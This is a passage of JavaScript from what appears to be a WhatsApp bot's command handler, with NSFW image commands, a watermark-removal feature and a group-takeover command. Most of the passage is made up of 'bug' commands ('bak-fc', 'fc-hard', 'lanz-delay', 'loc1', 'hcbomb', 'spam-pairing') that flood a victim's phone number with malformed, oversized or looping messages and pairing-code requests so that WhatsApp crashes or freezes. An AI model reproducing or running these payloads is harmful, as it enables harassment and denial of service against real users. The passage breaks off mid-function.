    } catch (e) {
      console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
    }
  }
  ReplyLanz(` ╭─❰ *RESULT SUMMARY* ❱─╮ 
  🎉 *Pesan Terkirim*: 
  ➥ *${total} Saluran* 
  ✅ *Status*: Berhasil! 
  📩 Harus jeda 10 menit
  ╰─────────────────────╯ `);
}
break;
case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return ReplyLanz(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return ReplyLanz("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return ReplyLanz(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return ReplyLanz("Berhasil mematikan *blacklistjpm* di grup ini")
} else return ReplyLanz(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'hentai-neko' :
case 'hentai':
case 'hneko' :
//if (!isRegistered) return registerbut(noregis)
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Putzz.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd2.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
//if (!isRegistered) return registerbut(noregis)
await Putzz.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
 let waifudd3 = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
Putzz.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd3.data.url } }, { quoted: m })
break
case 'gasm':
//if (!isRegistered) return registerbut(noregis)
await Putzz.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})						
 let waifudd4 = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Putzz.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd4.data.url } }, { quoted: m })
break 
case 'milf':
//if (!isRegistered) return registerbut(noregis)
await Putzz.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-asuma/resource/nsfw/milf.json'))
var kymyresult = pickRandom(ahegaonsfw)
Putzz.sendMessage(m.chat, { caption: "Done 🍏", image: { url: kymyresult.url } }, { quoted: m })
break 
case 'animespank':				
	//if (!isRegistered) return registerbut(noregis)
 let waifudd5 = await await axios.get(`https://nekos.life/api/v2/img/spank`) 
 Putzz.sendMessage(m.chat, { caption: `Here you go!`, image: {url:waifudd5.data.url} },{ quoted:m }).catch(err => {
 return('Error!')
 })
break

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
if (!isCreator && !isAdmins) return ReplyLanz(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Putzz.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Putzz.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

////ogleGenerativeAI } = require('@google/generative-ai')
 
case 'remove-wm': {
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
 
  let defaultPrompt = `Hapus watermark yang terdapat pada gambar. Perhatikan dengan teliti karena watermark bisa saja muncul di bagian atas, bawah, tengah, atau tersembunyi dengan ukuran kecil, transparan, atau blur. Hapus watermark tersebut secara menyeluruh tanpa mengurangi kualitas gambar asli dan tanpa mengubah elemen visual lainnya. Pastikan gambar tetap utuh, bersih, dan terlihat alami seolah tidak pernah memiliki watermark.`
  
  if (!mime) return ReplyLanz(`Kirim/reply gambar dengan caption *${usedPrefix + command}*`)
  if (!/image/.test(mime) ) return ReplyLanz(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`)
  
  let promptText = text || defaultPrompt
  
  ReplyLanz("Delete Watermark...")
 
  try {
    let imgData = await q.download()
    let genAI = new GoogleGenerativeAI("Gemini_Apikey")
 
    const base64Image = imgData.toString("base64")
 
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ]
 
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    })
 
    const response = await model.generateContent(contents)
 
    let resultImage
    let resultText = ""
 
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text
      } else if (part.inlineData) {
        const imageData = part.inlineData.data
        resultImage = Buffer.from(imageData, "base64")
      }
    }
 
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "tmp", `gemini_${Date.now()}.png`)
      fs.writeFileSync(tempPath, resultImage)
 
      await Putzz.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Delete Watermark*`
      }, { quoted: m })
 
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath)
        } catch {}
      }, 30000)
    } else {
      ReplyLanz("Yah Errror")
    }
  } catch (error) {
    console.error(error)
    ReplyLanz(`${error.message}`)
  }
}
break

case "kudetagc": case "kudeta": {
if (!isCreator) return ReplyLanz(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return ReplyLanz("Grup Ini Sudah Tidak Ada Member!")
await ReplyLanz("Kudeta Grup By Skyzo Starting 🔥")
for (let i of memberFilter) {
await Putzz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await ReplyLanz("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break


/*
*[ CASE PH LOGO ]*


SOURCE CASE
https://whatsapp.com/channel/0029VaxCZ9I9cDDdrAIznL0S

SUMBER SHARE
https://whatsapp.com/channel/0029Vb4HHTJFCCoYgkMjn93K

SOURCE PLUGIN
https://whatsapp.com/channel/0029Vb91Rbi2phHGLOfyPd3N/1224

SOURCE SCAPER 

*/
case 'phlogo': {
  if (!text || !text.includes('|')) {
    return ReplyLanz(`Masukkan dua teks dipisah dengan "|"\nContoh: *.${command} Zenz|XD*`)
  }

  let [text1, text2] = text.split('|').map(t => t.trim())
  if (!text1 || !text2) return ReplyLanz('Kedua teks harus diisi!')

  try {
    const apiUrl = `https://apikey.sazxofficial.web.id/api/imagecreator/pornhub?text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`
    const res = await fetch(apiUrl)
    const json = await res.json()

    if (!json.status) return ReplyLanz('Gagal mengambil gambar dari API.')

    await Putzz.sendMessage(m.chat, {
      image: { url: json.result },
      caption: `✅ *Berhasil membuat logo Pornhub*\n\n• *Text1:* ${text1}\n• *Text2:* ${text2}`,
      contextInfo: {
        externalAdReply: {
          title: "Pornhub Logo Generator",
          body: "Powered By Lanzzz bot - MD",
          thumbnailUrl: json.result,
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: json.result
        }
      }
    }, { quoted: m })

  } catch (e) {
    ReplyLanz('Terjadi kesalahan saat memproses permintaan.')
    console.error(e)
  }
}
break
case "db": {
if (!isCreator && !isAddb) return ReplyLanz("khusus akses add database")
const axios = require("axios")

const GITHUB_REPO = "LanzNotDev/rawrrrr"
const GITHUB_FILE = "database.json"
const GITHUB_PAT = global.githubToken

const RAW_URL = `https://raw.githubusercontent.com/${GITHUB_REPO}/main/${GITHUB_FILE}`
const API_URL = `https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_FILE}`

async function fetchNumbers(){
try{
const res = await axios.get(RAW_URL,{headers:{'Cache-Control':'no-cache'}})
return res.data?.numbers || []
}catch{
return []
}
}

async function updateNumbers(numbers){
try{

const {data} = await axios.get(API_URL,{
headers:{Authorization:`token ${GITHUB_PAT}`}
})

const sha = data.sha

const content = Buffer
.from(JSON.stringify({numbers},null,2))
.toString("base64")

await axios.put(API_URL,{
message:"update numbers",
content,
sha
},{
headers:{Authorization:`token ${GITHUB_PAT}`}
})

return true

}catch(e){
console.log(e)
return false
}
}

let args = text.split(" ")

let action = args[0]

if(!action) return ReplyLanz(`Gunakan:

.db add 628xxxx
.db del 628xxxx
.db list`)

let numbers = await fetchNumbers()

if(action === "list"){

if(numbers.length === 0)
return ReplyLanz("Database kosong")

let txt = "📂 LIST DATABASE\n\n"

numbers.forEach((n,i)=>{
txt += `${i+1}. ${n}\n`
})

return ReplyLanz(txt)

}

let number = (args[1] || "").replace(/[^0-9]/g,"")

if(number.startsWith("0"))
number = "62"+number.slice(1)

if(!number)
return ReplyLanz("Masukkan nomor!")

if(action === "add"){

if(numbers.includes(number))
return ReplyLanz("⚠️ Nomor sudah ada")

numbers.push(number)

let ok = await updateNumbers(numbers)

if(ok)
ReplyLanz(`✅ Nomor berhasil ditambahkan\n${number}`)
else
ReplyLanz("❌ Gagal menambah nomor")

}

else if(action === "del"){

numbers = numbers.filter(n => n !== number)

let ok = await updateNumbers(numbers)

if(ok)
ReplyLanz(`✅ Nomor berhasil dihapus\n${number}`)
else
ReplyLanz("❌ Gagal hapus nomor")

}

else{
ReplyLanz("Command tidak dikenal")
}

}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

            case 'spam-pairing':
            case 'spampair': {
                if (!isCreator && !isPremium) return ReplyLanz(mess.owner)
                if (!text) return ReplyLanz(`*Example:* ${prefix + command} +628xxxxxx|150`)
                ReplyLanz(mess.wait)
                let [peenis, pepekk = "100"] = text.split("|")

                let target = peenis.replace(/[^0-9]/g, '').trim()
                let {
                    default: makeWaSocket,
                    WAConnection, 
                    useMultiFileAuthState,
                    fetchLatestBaileysVersion
                } = require('@whiskeysockets/baileys')
                let {
                    state
                } = await useMultiFileAuthState('pepek')
                let {
                    version
                } = await fetchLatestBaileysVersion()
                let pino = require("pino")
                let sucked = await makeWaSocket({
                    auth: state,
                    version,
                    logger: pino({
                        level: 'fatal'
                    })
                })

                for (let i = 0; i < pepekk; i++) {
                    await sleep(1500)
                    let prc = await sucked.requestPairingCode(target)
                    await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
                }
                await sleep(15000)
                ReplyLanz(`succes spam-pairing ${text}`)
            }
            break
case 'xcsystemui':
case 'bak-fc': {
    if (!isPremium && !isCreator) return ReplyLanz(mess.prem);
    if (!q) return ReplyLanz(`*Example: ${prefix + command} 6287392784527*`);
    
    let memek = q.replace(/[^0-9]/g, "");
    if (memek.startsWith('0')) {
        return ReplyLanz(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };

    let target = memek + "@s.whatsapp.net";

    try {
        for (let i = 0; i < 50; i++) {
            await paktzyBlank(target, ptcp = true);
            await paktzyBlank(target, ptcp = true);
            await paktzyBlank(target, ptcp = true);
            await paktzyBlank(target, ptcp = true);
        }

        await sleep(1000);
        await ReplyLanz("Succes send Bug");
    } catch (e) {
        if (e.code === 'EPIPE') {
            console.warn("❗ EPIPE: koneksi tertutup saat pengiriman.");
            return ReplyLanz("❌ Gagal kirim! Target tidak dapat menerima pesan atau koneksi tertutup.");
        } else {
            console.error("❗ Error saat eksekusi bak-fc:", e);
            return ReplyLanz("❌ Terjadi error saat menjalankan perintah.");
        }
    }
}
break;

case 'fc-hard': {
if (!isPremium && !isCreator) return ReplyLanz(mess.prem)
    if (!q) return ReplyLanz(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return ReplyLanz(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await ReplyLanz("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        await DelayOverload(target);
        await DelayOverload(target);
        await sleep(2000);
        await peotocolCarousel(target);
        await peotocolCarousel(target)
        }
    await sleep(1000);
    await ReplyLanz("succes send bug") 
}
break

case 'duar': {
if (!isPremium && !isCreator) return ReplyLanz(mess.prem)
    if (!q) return ReplyLanz(`*Example: ${prefix + command} 6287392784527*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return ReplyLanz(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 6287392784527_`);
    };
    await ReplyLanz("𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🦠") 
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 50; i++) {
        FcDelMsg(target)
        }
    await sleep(1000);
    await ReplyLanz("Done") 
}
break
case 'lanz-delay1': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return ReplyLanz(`Fitur Bug Khusus Owner`)        
    if (!q) 
       ReplyLanz(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return ReplyLanz(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi

    // Kirim bug ke target
    for (let i = 0; i < 50; i++) {
     await Putzzdelay(target); 
     await Putzzdelay(target)        
   }
   await Putzzdelay(target);
   await Putzzdelay(target)   
       Putzz.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5821/600092394_6726.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : ${command} [ 𝐃𝐞𝐥𝐚𝐲 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Done ✅
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 Menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
}
break

case 'lanz-delay2': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return ReplyLanz(`Fitur Bug Khusus Owner`)        
    if (!q) 
       ReplyLanz(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return ReplyLanz(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Putzz.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5418/593854023_Putzzy.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : ${command} [ 𝐃𝐞𝐥𝐚𝐲 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Done ✅
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 Menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 10; i++) {
     await depayblank(target); 
     await depayblank(target)      
   }
   await depayblank(target);
   await depayblank(target)   
}
break

case 'lanz-delay3': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return ReplyLanz(`Fitur Bug Khusus Owner`)        
    if (!q) 
       ReplyLanz(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return ReplyLanz(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Putzz.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5418/593854023_Putzzy.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : ${command} [ 𝐃𝐞𝐥𝐚𝐲 𝐇𝐚𝐫𝐝 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Done ✅
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
     await depayblank(target); 
     await depayblank(target)
     await depayblank(target);    
     await depayblank(target); 
   }
   await depayblank(target);
   await depayblank(target)   
}
break

case 'lanz-delay4': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return ReplyLanz(`Fitur Bug Khusus Owner`)        
    if (!q) 
       ReplyLanz(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return ReplyLanz(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Putzz.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5418/593854023_Putzzy.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : ${command} [ 𝐃𝐞𝐥𝐚𝐲 𝐇𝐚𝐫𝐝 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Done ✅
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
     await spack2(target); 
     await spack2(target)
     await spack2(target);    
     await spack2(target); 
   }
   await spack2(target);
   await spack2(target)   
}
break
//CASE BUG DELAY INVIS
//case 'loc2':
case 'loc1': {
    if (!m.isGroup) {
        await ReplyLanz('❌ Group only!');
        return;
    }
    
    await ReplyLanz('*🤖 NO CLICK FC ACTIVATED...*');
    
    // Background crash payload
    const bg = "𑇂".repeat(1000000) + "💥".repeat(500000);
    
    // Send 200 messages in background
    for (let i = 0; i < 200; i++) {
        setTimeout(() => {
            Putzz.relayMessage(m.chat, {
                locationMessage: {
                    degreesLatitude: -999999999999,
                    degreesLongitude: 999999999999,
                    name: bg.substring(0, 25000) + ` BG.${i}`,
                    accuracyInMeters: 999999999,
                    speedInMps: 999999999
                }
            }, { messageId: "" }).catch(() => {});
        }, i * 1); // Har 1ms mein ek message
    }
    
    await ReplyLanz('*✅ BACKGROUND CRASH ACTIVE*\n\nApp force close ho jayega bina click kiye!');
    break;
}
case 'hcbomb': {
    const args = m.text.split(' ')
    if (args.length < 2) {
        return ReplyLanz('❌ Usage: .hc 923001234567')
    }
    
    const target = args[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
    await ReplyLanz(`🏠 *HOME CRASH BOMB TO ${args[1]}*\n\nPreparing attack...`)
    
    // ===== 1. MEGA PAYLOAD (50MB data) =====
    const megaChars = "𑇂".repeat(50000000) // 5 crore chars
    const megaBuffer = Buffer.alloc(25000000, 0xFF) // 25MB buffer
    
    // ===== 2. HOME SCREEN CRASH PAYLOAD =====
    // Yeh messages home screen par hi dikhenge bina open kiye
    for (let i = 0; i < 5; i++) {
        try {
            // Message with large preview
            await Putzz.sendMessage(target, {
                text: megaChars.substring(0, 200000) + i,
                contextInfo: {
                    forwardingScore: 999999999,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '0@newsletter',
                        newsletterName: megaChars.substring(0, 50000),
                        serverMessageId: 999999999
                    },
                    externalAdReply: {
                        title: megaChars.substring(0, 20000),
                        body: megaChars.substring(0, 20000),
                        mediaType: 1,
                        thumbnail: megaBuffer.slice(0, 100000)
                    }
                }
            }).catch(() => {})
            
            // Location with large preview
            await Putzz.sendMessage(target, {
                location: {
                    degreesLatitude: -999999999,
                    degreesLongitude: 999999999,
                    name: megaChars.substring(0, 100000) + i,
                    comment: megaChars.substring(0, 100000)
                },
                contextInfo: {
                    forwardingScore: 999999999,
                    isForwarded: true
                }
            }).catch(() => {})
            
            // Document with large preview
            await Putzz.sendMessage(target, {
                document: megaBuffer.slice(0, 1000000),
                mimetype: 'application/pdf',
                fileName: megaChars.substring(0, 10000) + '.pdf',
                caption: megaChars.substring(0, 50000)
            }).catch(() => {})
            
            await new Promise(r => setTimeout(r, 100))
            
        } catch (e) {}
    }
    
    // ===== 3. FINAL HOME SCREEN BOMB =====
    await ReplyLanz(`💥 *FINAL HOME BOMB TO ${args[1]}*`)
    
    // 50 messages with large notifications
    for (let i = 0; i < 5; i++) {
        setTimeout(() => {
            Putzz.sendMessage(target, {
                text: "🏠 HOME CRASH " + i + " " + megaChars.substring(0, 50000),
                contextInfo: {
                    mentionedJid: [target, ...Array(100).fill('0@s.whatsapp.net')],
                    forwardingScore: 999999999
                }
            }).catch(() => {})
        }, i * 30)
    }
    
    await ReplyLanz(`✅ *HOME CRASH COMPLETE*\n\nTarget ka WhatsApp home screen crash ho jayega!`)
    break
}
case 'lanz-invis1': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return ReplyLanz(`Fitur Bug Khusus Owner`)        
    if (!q) 
       ReplyLanz(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return ReplyLanz(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Putzz.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5418/593854023_Putzzy.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : ${command} [ 𝐃𝐞𝐥𝐚𝐲 𝐇𝐚𝐫𝐝 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Done ✅
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 10; i++) {
      
     await Putzzdelay(target)
     await Putzzdelay(target);           
   }
   await invisnika1(target);
   await nikadelay2(target)   
}
break

case 'lanz-invis2': {
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return ReplyLanz(`Fitur Bug Khusus Owner`)        
    if (!q) 
       ReplyLanz(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return ReplyLanz(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Putzz.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5418/593854023_Putzzy.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : ${command} [ 𝐃𝐞𝐥𝐚𝐲 𝐇𝐚𝐫𝐝 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Done ✅
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
     await invisnika1(target); 
     await Putzzdelay(target)     
     await Putzzdelay(target); 
     await bulldozer(target);
     await Putzzdelay(target);
     await invisnika1(target)  
   }
   
   await invisnika1(target)   
}
break

case 'tastoss': {
async function ClickFcGroup(Putzz, target) {
  await iki.relayMessage(target, {
    locationMessage: {
      degreesLatitude: -121211,
      degreesLongitude: 4342221,
      name: "꙳͙͡༑ᐧ̤⿻⌜𝑲͢𝒚ͯ𝐳ͮ 𖣂 𝑪͢𝒓ͯ𝒂͡𝒔͢𝒉ͮ⌟⿻",
      address: "꙳͙͡༑ᐧ̤⿻⌜𝑲͢𝒚ͯ𝐳ͮ 𖣂 𝑪͢𝒓ͯ𝒂͡𝒔͢𝒉ͮ⌟⿻"
    }
  }, { 
    participant: { 
      jid: target 
    } 
  });
}
async function ClickFcPrivate(Putzz, target) {
  await Putzz.relayMessage(target, {
    locationMessage: {
      degreesLatitude: -121211,
      degreesLongitude: 4342221,
      name: "꙳͙͡༑ᐧ̤⿻⌜𝑲͢𝒚ͯ𝐳ͮ 𖣂 𝑪͢𝒓ͯ𝒂͡𝒔͢𝒉ͮ⌟⿻",
      address: "꙳͙͡༑ᐧ̤⿻⌜𝑲͢𝒚ͯ𝐳ͮ 𖣂 𝑪͢𝒓ͯ𝒂͡𝒔͢𝒉ͮ⌟⿻"
    }
  }, {});
}
    // Tambahkan pengecekan akses
    if (!isOwner && !isPremium) return ReplyLanz(`Fitur Bug Khusus Owner`)        
    if (!q) 
       ReplyLanz(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return ReplyLanz(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;
 
    // Kirim pesan konfirmasi
    Putzz.sendMessage(m.chat, { 
        image: { url: `https://img1.pixhost.to/images/5418/593854023_Putzzy.jpg` },
        caption: `╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣
┃ 𝐓𝐲𝐩𝐞 : ${command} [ 𝐃𝐞𝐥𝐚𝐲 𝐇𝐚𝐫𝐝 ]
┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : ${pepec}
┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Done ✅
┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 menit!.
╰━━━━━━━━━━━━━━━━━⬣`,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 10; i++) {
     await Putzzdelay(target); 
      
     await ClickFcPrivate(Putzz, target)
   }
}
break

case '✅': {
async function ButtonVidio(Lanzexe, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
